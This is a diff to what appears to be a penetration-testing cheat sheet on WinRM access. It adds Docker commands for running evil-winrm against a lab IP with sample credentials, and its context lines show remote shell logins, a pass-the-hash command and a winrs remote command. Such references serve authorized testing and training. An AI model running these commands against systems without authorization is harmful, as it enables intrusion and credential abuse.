@@ -41,13 +41,23 @@ evil-winrm -u Administrator -p 'EverybodyWantsToWorkAtP.O.O.'  -i <IP>/<Domain>
 
 To use evil-winrm to connect to an **IPv6 address** create an entry inside _**/etc/hosts**_ setting a **domain name** to the IPv6 address and connect to that domain.
 
+### Docker evil-winrm
+
+```
+sudo docker pull oscarakaelvis/evil-winrm
+```
+
+```
+sudo docker run --rm -ti --name evil-winrm -v /home/foo/ps1_scripts:/ps1_scripts -v /home/foo/exe_files:/exe_files -v /home/foo/data:/data oscarakaelvis/evil-winrm -i 10.129.169.244 -u tony -p 'liltony' -s '/ps1_scripts/' -e '/exe_files/'
+```
+
 ### Pass the hash with evil-winrm
 
 ```ruby
 evil-winrm -u <username> -H <Hash> -i <IP>
 ```
 
-### Winrs
+### Winrs (Windows)
 
 ```
 winrs -r:192.168.1.105 -u:ignite.local\administrator -p:Ignite@987 ipconfig
